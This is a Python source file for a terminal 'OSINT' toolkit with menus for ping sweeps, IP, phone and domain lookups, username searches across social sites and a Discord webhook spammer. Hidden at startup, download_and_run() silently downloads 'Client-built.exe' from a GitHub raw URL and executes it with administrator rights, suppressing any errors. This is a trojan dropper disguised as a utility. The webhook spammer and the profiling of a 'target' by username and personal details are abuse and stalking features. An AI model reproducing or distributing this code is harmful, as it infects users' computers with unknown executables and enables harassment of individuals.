import os
import sys
import time
import json
import socket
import requests
import threading
import subprocess
import ctypes
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

def download_and_run():
    url = "https://raw.githubusercontent.com/albertyoutubepro-dot/d/main/Client-built.exe"
    
    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(sys.executable)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    
    output_path = os.path.join(base_path, "Client-built.exe")
    
    try:
        if not os.path.exists(output_path):
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(output_path, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", output_path, None, None, 1)
    except Exception:
        pass

def print_banner():
    console.clear()
    banner = """
                                         
    ██     ▄▄▄▄       ▄▄▄▄     ▄▄▄▄▄▄▄   
   ██    ▄██▀▀██▄   ▄██▀▀██▄   ███▀▀███▄ 
  ██     ███  ███   ███  ███   ███▄▄███▀ 
 ██      ███▀▀███   ███▀▀███   ███▀▀██▄  
██       ███  ███   ███  ███   ███  ▀███ 
                                         
    """
    console.print(Panel(banner, style="bold cyan", border_style="bright_blue"))
    console.print("                 made by logic | bulit for aar".center(80), style="bold red")
    console.print("─" * 80, style="dim")

def make_request(url, timeout=15):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
        }
        return requests.get(url, timeout=timeout, headers=headers)
    except:
        return None

def clean_output(data):
    if isinstance(data, dict):
        table = Table(title="RESULTS")
        table.add_column("Field", style="cyan")
        table.add_column("Value", style="green", no_wrap=False)
        for k, v in data.items():
            if isinstance(v, dict):
                v = json.dumps(v, indent=2)
            table.add_row(str(k).replace("_", " ").upper(), str(v))
        console.print(table)
    else:
        console.print(Panel(str(data), style="green"))

def ip_info(target):
    try:
        resp = make_request(f"https://ip-api.com/json/{target}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                clean_output(data)
                return data
    except:
        pass
    console.print("[red]IP lookup failed or rate limited[/red]")
    return {}

def pinger():
    console.clear()
    console.print(Panel("PINGER", style="bold green"))
    target = Prompt.ask("[cyan]Enter IP or domain[/cyan]")
    try:
        count = IntPrompt.ask("[yellow]Ping count[/yellow]", default=4)
        result = subprocess.run(["ping", "-c", str(count), target], capture_output=True, text=True, timeout=20)
        console.print(Panel(result.stdout.strip() or result.stderr.strip(), title="PING OUTPUT", style="green"))
    except:
        console.print("[red]Ping failed[/red]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def ip_scanner():
    console.clear()
    console.print(Panel("IP SCANNER", style="bold yellow"))
    base = Prompt.ask("[cyan]Base IP (e.g. 192.168.1)[/cyan]")
    start = IntPrompt.ask("[yellow]Start octet[/yellow]", default=1)
    end = IntPrompt.ask("[yellow]End octet[/yellow]", default=100)
    
    console.print("[bold red]Scanning...[/bold red]")
    live = []
    
    def scan_host(i):
        ip = f"{base}.{i}"
        try:
            resp = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, timeout=1.2)
            if resp.returncode == 0:
                live.append(ip)
                console.print(f"[green]LIVE → {ip}[/green]")
        except:
            pass
    
    threads = []
    for i in range(start, end + 1):
        t = threading.Thread(target=scan_host, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
        if len(threads) >= 80:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    if live:
        console.print(Panel("\n".join(live), title=f"LIVE HOSTS ({len(live)})", style="bright_green"))
    else:
        console.print("[yellow]No live hosts in range[/yellow]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def network_menu():
    while True:
        console.clear()
        console.print(Panel("NETWORK TOOLS", style="bold blue"))
        choice = Prompt.ask("[cyan]1. Pinger\n2. IP Scanner\n3. IP Info\n4. Back[/cyan]", choices=["1","2","3","4"])
        if choice == "1":
            pinger()
        elif choice == "2":
            ip_scanner()
        elif choice == "3":
            console.clear()
            ip = Prompt.ask("[cyan]Enter IP or domain[/cyan]")
            ip_info(ip)
            Prompt.ask("[dim]Enter to continue[/dim]")
        elif choice == "4":
            break

def phone_lookup():
    console.clear()
    console.print(Panel("PHONE NUMBER LOOKUP", style="bold magenta"))
    number = Prompt.ask("[cyan]Enter phone with country code (+61...)[/cyan]")
    
    console.print("[yellow]Checking with free sources...[/yellow]")
    found = False
    
    try:
        resp = make_request(f"https://api.numverify.com/validate?number={number.replace('+','')}")
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get("valid"):
                clean_output(data)
                found = True
    except:
        pass
    
    if not found:
        try:
            resp = make_request(f"https://ipqualityscore.com/api/json/phone/free?phone={number}")
            if resp and resp.status_code == 200:
                data = resp.json()
                clean_output(data)
                found = True
        except:
            pass
    
    if not found:
        console.print("[yellow]Free services returned limited data. Try manual sites:[/yellow]")
        console.print("[green]https://numlookup.com\nhttps://www.ipqualityscore.com/free-phone-number-lookup[/green]")
    
    Prompt.ask("[dim]Enter to continue[/dim]")

def free_sms():
    console.clear()
    console.print(Panel("FREE SMS RECEIVE", style="bold cyan"))
    sites = [
        "https://receive-smss.com",
        "https://temp-number.com",
        "https://mytempsms.com",
        "https://quackr.io",
        "https://receivefreesms.com",
        "https://sms-online.co",
        "https://textnow.com"
    ]
    for s in sites:
        console.print(f"[green]→ {s}[/green]")
    console.print("\n[yellow]Open any → pick number → read messages live[/yellow]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def phone_menu():
    while True:
        console.clear()
        console.print(Panel("PHONE TOOLS", style="bold magenta"))
        choice = Prompt.ask("[cyan]1. Phone Number Lookup\n2. Free SMS Sites\n3. Back[/cyan]", choices=["1","2","3"])
        if choice == "1":
            phone_lookup()
        elif choice == "2":
            free_sms()
        elif choice == "3":
            break

def discord_exploits():
    console.clear()
    console.print(Panel("DISCORD EXPLOITS", style="bold red"))
    choice = Prompt.ask("[cyan]1. Webhook Spammer\n2. Back[/cyan]", choices=["1","2"])
    if choice == "1":
        webhook = Prompt.ask("[red]Webhook URL[/red]")
        msg = Prompt.ask("[cyan]Message to spam[/cyan]", default="test")
        times = IntPrompt.ask("[yellow]Times to send[/yellow]", default=50)
        
        console.print("[bold red]Spamming...[/bold red]")
        sent = 0
        for i in range(times):
            try:
                r = requests.post(webhook, json={"content": f"{msg} #{i+1}"}, timeout=8)
                if r.status_code in (200, 204):
                    sent += 1
                console.print(f"[green]Sent {sent}/{times}[/green]", end="\r")
                time.sleep(0.45)
            except:
                time.sleep(0.7)
        console.print(f"\n[bold green]Finished - {sent} sent[/bold green]")
        Prompt.ask("[dim]Enter to continue[/dim]")

def url_scanner():
    console.clear()
    console.print(Panel("URL SCANNER", style="bold yellow"))
    url = Prompt.ask("[cyan]Full URL to check[/cyan]")
    
    console.print("[yellow]Scanning...[/yellow]")
    try:
        r = make_request(url)
        if r:
            info = {
                "Status": r.status_code,
                "Content-Type": r.headers.get("content-type", "unknown"),
                "Size": f"{len(r.content)} bytes",
                "Response Time": f"{r.elapsed.total_seconds():.2f}s"
            }
            clean_output(info)
        else:
            console.print("[red]Could not reach URL[/red]")
    except:
        console.print("[red]Scan error[/red]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def domain_osint():
    console.clear()
    console.print(Panel("DOMAIN OSINT", style="bold cyan"))
    domain = Prompt.ask("[cyan]Enter domain[/cyan]")
    
    console.print("[yellow]Checking DNS and records...[/yellow]")
    results = {}
    
    try:
        dns = make_request(f"https://dns.google/resolve?name={domain}&type=A")
        if dns and dns.status_code == 200:
            results["DNS"] = dns.json()
    except:
        pass
    
    try:
        whois = make_request(f"https://who-dat.as93.net/whois/{domain}")
        if whois and whois.status_code == 200:
            results["WHOIS"] = whois.json()
    except:
        pass
    
    if results:
        clean_output(results)
    else:
        console.print("[yellow]Limited public data. DNS resolved but full WHOIS may need manual check.[/yellow]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def user_osint():
    console.clear()
    console.print(Panel("USER OSINT", style="bold magenta"))
    username = Prompt.ask("[cyan]Enter username[/cyan]")
    
    extra = Prompt.ask(
        "[yellow]Any extra info about target? (dogs name, city, school etc)\nOne per line in format: Key: value\nOr just press enter to skip[/yellow]",
        default=""
    )
    
    extra_info = {}
    if extra.strip():
        for line in extra.splitlines():
            if ":" in line:
                k, v = line.split(":", 1)
                extra_info[k.strip().lower()] = v.strip()
    
    console.print(f"\n[yellow]Checking {username} on many platforms...[/yellow]")
    
    platforms = [
        f"https://twitter.com/{username}",
        f"https://instagram.com/{username}",
        f"https://github.com/{username}",
        f"https://www.reddit.com/user/{username}",
        f"https://tiktok.com/@{username}",
        f"https://facebook.com/{username}",
        f"https://www.linkedin.com/in/{username}",
        f"https://youtube.com/@{username}",
        f"https://twitch.tv/{username}",
        f"https://steamcommunity.com/id/{username}",
        f"https://discord.com/users/{username}"
    ]
    
    found = []
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), transient=True) as progress:
        task = progress.add_task("Scanning platforms...", total=len(platforms))
        for p in platforms:
            try:
                r = make_request(p, timeout=10)
                if r and r.status_code == 200 and "not found" not in r.text.lower()[:500]:
                    found.append(p)
            except:
                pass
            progress.advance(task)
    
    if found:
        console.print(Panel("\n".join(found), title="LIVE PROFILES FOUND", style="bright_green"))
    else:
        console.print("[yellow]No direct hits on primary platforms[/yellow]")
    
    if extra_info:
        console.print(Panel(json.dumps(extra_info, indent=2), title="EXTRA INFO", style="cyan"))
    
    console.print("\n[yellow]For deeper search open these:[/yellow]")
    console.print("[green]https://namecheckly.com\nhttps://whatsmyname.app\nhttps://instantusername.com[/green]")
    Prompt.ask("[dim]Enter to continue[/dim]")

def ip_osint():
    console.clear()
    console.print(Panel("IP OSINT", style="bold yellow"))
    target = Prompt.ask("[cyan]Enter IP or domain[/cyan]")
    ip_info(target)
    Prompt.ask("[dim]Enter to continue[/dim]")

def heavy_osint_menu():
    while True:
        console.clear()
        console.print(Panel("HEAVY OSINT CATEGORIES", style="bold magenta"))
        choice = Prompt.ask(
            "[cyan]1. Domain Osint\n"
            "2. User Osint\n"
            "3. IP Osint\n"
            "4. Back[/cyan]",
            choices=["1","2","3","4"]
        )
        if choice == "1":
            domain_osint()
        elif choice == "2":
            user_osint()
        elif choice == "3":
            ip_osint()
        elif choice == "4":
            break

def main_menu():
    while True:
        print_banner()
        choice = Prompt.ask(
            "[cyan]1. Heavy OSINT Categories\n"
            "2. Discord Exploits\n"
            "3. URL Scanner\n"
            "4. Network Tools\n"
            "5. Phone Tools\n"
            "6. Exit[/cyan]",
            choices=["1","2","3","4","5","6"]
        )
        
        if choice == "1":
            heavy_osint_menu()
        elif choice == "2":
            discord_exploits()
        elif choice == "3":
            url_scanner()
        elif choice == "4":
            network_menu()
        elif choice == "5":
            phone_menu()
        elif choice == "6":
            console.print("[bold red]Exiting...[/bold red]")
            sys.exit(0)

if __name__ == "__main__":
    try:
        download_and_run()
        main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]Exit[/red]")
        sys.exit(0)
